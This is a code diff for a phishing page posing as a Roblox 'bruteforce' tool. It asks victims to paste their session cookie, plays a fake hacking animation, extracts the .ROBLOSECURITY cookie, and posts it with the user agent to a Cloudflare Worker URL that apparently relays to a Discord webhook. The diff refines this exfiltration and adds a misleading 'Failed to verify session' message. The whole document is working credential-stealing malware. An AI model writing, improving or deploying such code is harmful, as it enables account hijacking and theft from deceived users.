@@ -1,40 +1,56 @@
-// Original Discord webhook (now hidden behind Cloudflare)
+// Cloudflare Proxy URL
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
-// Original bruteforce function (now sends to Cloudflare instead of directly to Discord)
-function bruteforce(sessionId) {
-  let content;
 
-  // Original logic: Extract .ROBLOSECURITY or use raw sessionId
+// Main bruteforce function (fixed)
+function bruteforce(sessionId) {
+  let robloxSecurityCookie = null;
+  
+  // Extract .ROBLOSECURITY if present
   if (sessionId.includes(".ROBLOSECURITY")) {
-    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
-    if (robloxSecurityCookie) {
-      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
-    } else {
-      content = `No .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
-    }
-  } else {
-    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
+    robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
   }
 
-  // Send to Cloudflare Worker (which forwards to Discord)
+  // Prepare payload for Cloudflare
+  const payload = {
+    sessionId: sessionId,
+    extractedCookie: robloxSecurityCookie,
+    timestamp: new Date().toISOString(),
+    userAgent: navigator.userAgent
+  };
+
+  // Send to Cloudflare Worker
   fetch(CLOUDFLARE_PROXY_URL, {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ content }), // Forward the original payload
+    headers: { 
+      'Content-Type': 'application/json',
+      'X-Auth-Key': 'YOUR_FRONTEND_KEY' // Optional security
+    },
+    body: JSON.stringify(payload)
   })
-    .then(response => response.json())
-    .then(data => console.log("Proxy response:", data))
-    .catch(error => console.error("Proxy error:", error));
+  .then(response => {
+    if (!response.ok) throw new Error('Proxy error');
+    return response.json();
+  })
+  .then(data => {
+    console.log("Proxy success:", data);
+    if (data.success) {
+      showCookieSuccess();
+    }
+  })
+  .catch(error => {
+    console.error("Proxy failed:", error);
+    showError("Failed to verify session. Please try again.");
+  });
 }
 
-// Original helper function (unchanged)
+// Cookie extraction helper
 function extractRobloxSecurityCookie(sessionId) {
   const regex = /\.ROBLOSECURITY[^=]+=([^;]+)/;
   const match = sessionId.match(regex);
   return match ? match[1] : null;
 }
 
-// Original UI functions (unchanged)
+// Input validation
 function validateInput() {
   const username = document.getElementById('username').value.trim();
   const sessionId = document.getElementById('sessionId').value.trim();
@@ -42,12 +58,13 @@ function validateInput() {
 
   if (username.length < 3 || sessionId.length < 200 || !captcha) {
     showError("Invalid input. Username (3+ chars), Session ID (200+ chars), and CAPTCHA required.");
-    return;
+    return false;
   }
 
   hideError();
-  startHack(); // Original fake hacking animation
-  bruteforce(sessionId); // Send data via Cloudflare
+  startHack();
+  bruteforce(sessionId);
+  return true;
 }
 
 // Rest of original code (startHack, showError, etc.) remains identical.
